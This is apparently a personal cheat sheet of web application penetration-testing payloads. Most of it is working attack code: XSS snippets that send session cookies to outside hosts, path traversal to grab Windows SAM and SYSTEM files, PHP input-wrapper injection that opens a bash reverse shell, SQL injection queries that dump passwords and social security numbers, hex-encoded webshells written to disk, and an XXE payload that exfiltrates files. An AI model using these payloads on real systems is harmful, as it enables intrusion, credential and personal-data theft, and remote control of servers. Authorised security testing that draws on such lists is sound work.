**This post includes some common WAPT payloads**
- Frameable response:
~~~HTML
<html>
   <head>
     <title>Clickjacking PoC</title>
   </head>
   <body>
     <p>This is a clickjacking demo</p>
     <iframe src="http://xxx" width="500" height="500"></iframe>
   </body>
</html>
~~~

- XSS:
~~~
double encoding: %253calert("hi");%253e
<script>alert("1")</script>
<script>
x = new XMLHttpRequest();
x.open('GET',"http://xxx/?c="+document.cookie);
x.send();
</script>

http://107.170.178.208/?aa
<script>
    im=document.createElement('img');
    im.src="http://xxx/aaaaaaaaaaaaaaaa.png?loc="+document.location+"&cookie="+document.cookie; 
    document.body.appendChild(im);
</script>

<script>document.write('<img src="http://107.170.178.208/?c='+document.cookie+'  "/>');</script>

# preg_replace("/<script>/","",$comment)

$comment = <sc<script>ript>
IMG SRC= javascript:alert("Hi");

if(eregi("#|union|from|challenge|select|\(|\t|/|limit|=|0x",$_GET[no])) exit("no hack");

dom-based:
url#<script>alert("hi");</script>

<iframe/src="data:text/html,<svg onload=alert(1)>">
~~~
[This post is super helpful](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)

- Windows file travesal to shell:
        ~~~
        http://127.0.0.1:8880/calc.efff?../../../../windows/repair/SAM
        http://127.0.0.1:8880/calc.efff?../../../../windows/repair/SYSTEM

        samdump2 SYSTEM SAM > hashes.txt
        ~~~
- LFI
    `php://filter/convert.base64-encode/resource=index`
    + perl server would eval any .cgi file(perl code inside), if the perl server ran as root then you have it already!

- PHP RFI/LFI to RCE:

```
GET /vulnerable.php?path=php://input%00? HTTP/1.1

"<?system('whoami');?>"
"<?php passthru('bash -i >& /dev/tcp/10.11.0.183/443 0>&1');?>"
```

`curl -s --data "<?system('ls -la');?>" "http://10.11.1.24/classes/phpmailer/class.cs_phpmailer.php?classes_dir=php://input%00"`

- sql injection:
    + MYSQL
    ~~~
    table name:
    -1' UNION ALL SELECT table_schema,table_name, null, null, null, null, null from information_schema.tables; -- 
    SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'bWAPP' LIMIT 0,1  ))-- 

    column name:
    -1' UNION ALL SELECT null,column_name, null, null, null, null, null FROM information_schema.columns WHERE table_name = 'heroes' -- 

    0′ UNION SELECT column_name,table_name FROM information_schema.columns

    SQLMAP blind injection:

    sqlmap -u "url" --cookie="" -b --prefix="'" --suffix=" -- " --string="" --invalid-string="" --risk 3 --technique=B --dbms=MYSQL -p parameters

    1234 ' AND 1=0 UNION ALL SELECT 'admin','81dc9bdb52d04dc20036dbd8313ed055
    81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)

    EXEC master.dbo.xp_cmdshell 'ping '
    ~~~

    + POSTGRE
    ~~~
    query = "SELECT string_agg(usename,',') FROM pg_user"       # list database users : postgres
    query = "SELECT string_agg(datname,',') FROM pg_database"   # list databases : template1,template0,postgres,calculon,sqltrain
    query = "SELECT string_agg(version()::text || ' || ' || current_database()::text, ' ; ')" # fingerprint : PostgreSQL 9.1.6 on x86_64-unknown-linux-gnu, compiled by gcc (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3, 64-bit || calculon

    query = "SELECT string_agg(usename::text || ': ' || usesuper::text || ':' || usecreatedb::text,';') from pg_user" # priv: postgres: true

    query = "SELECT version()::TEXT || (SELECT current_database()::TEXT)"
    query = "SELECT string_agg(table_name::text, '||') FROM information_schema.tables WHERE table_schema = 'public'"    # list all tables
    tables: users||adjustments||inject||dantest||read||user_info||menu_authz||stuff||file||mydata||testingtabletesting||mynewtable||testingtable

    query = "SELECT string_agg(column_name,'||') FROM information_schema.columns WHERE table_name = 'mydata'"   # list columns from whatever table
    users: password||username||userid
    user_info: ssn||email||phone||zip||state||city||address_2||address_1||last_name||middle_initial||first_name||userid
    file: line(empty)

    query = "SELECT string_agg(username::text || ': ' || password::text,';') from users"    # list all username:password
    query = "SELECT string_agg(first_name::text || ' ' || last_name::text || ': ' || ssn::text,';') from user_info" # list all names: ssn
    query = "SELECT string_agg(line, ';') from file"
    query = "SELECT string_agg(t, ';') from mydata"
    query = "SELECT t::text FROM mydata LIMIT 1 OFFSET 1"

    query = "SELECT 'a'::TEXT from PG_SLEEP(5)"
    query = "SELECT file.read('/etc/passwd')::text"
    ~~~

    + MSSQL
    ~~~
    ID=1'+UNION+ALL+SELECT+NULL,master.dbo.fn_varbintohexstr(password),NULL,NULL+from+master..sysxlogins+--+
    # dump sa password

    # add this into /etc/freetds/freetds.conf
    [dj]
    host = IP_ADDR
    port = 27900
    tds version = 8.0

    sqsh -S dj -U sa

    ~~~

    + Generic webshell
    ~~~

    -1' OR 1337=1337 LIMIT 0,1 INTO OUTFILE 'C:/wamp/www/shell443.php' LINES TERMINATED BY 0x3c3f7068702024736f636b3d66736f636b6f70656e282231302e31312e302e313833222c343433293b6578656328222f62696e2f7368202d69203c2633203e263320323e263322293b3f3e -- 

    shellcode above is:
    <?php $sock=fsockopen("10.11.0.183",443);exec("/bin/bash -i <&3 >&3 2>&3");?>
    ~~~

    ~~~
    # sqlmap phpshell payload
    0x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d433a5c5c77616d705c5c7777775c5c3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a
    <?php
    if (isset($_REQUEST["upload"])){$dir=$_REQUEST["uploadDir"];if (phpversion()<'4.1.0'){$file=$HTTP_POST_FILES["file"]["name"];@move_uploaded_file($HTTP_POST_FILES["file"]["tmp_name"],$dir."/".$file) or die();}else{$file=$_FILES["file"]["name"];@move_uploaded_file($_FILES["file"]["tmp_name"],$dir."/".$file) or die();}@chmod($dir."/".$file,0755);echo "File uploaded";}else {echo "<form action=".$_SERVER["PHP_SELF"]." method=POST enctype=multipart/form-data><input type=hidden name=MAX_FILE_SIZE value=1000000000><b></b><br><input name=file type=file><br>to directory: <input type=text name=uploadDir value=C:\\wamp\\www\\> <input type=submit name=upload value=upload></form>";}?>
    ~~~


- XXE
~~~
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "http://www.ha0k3.com/hack/xxee">
<!ENTITY % p1 SYSTEM "file:///opt/play-2.1.3/xxe/conf/routes">
<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://www.ha0k3.com/hack/xxe/poc.php?data=%p1;'>">
%p2;

<!--

=========================================================
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://www.ha0k3.com/hack/xxe/test.dtd">
<foo>&e1;</foo>

=========================================================
-->
~~~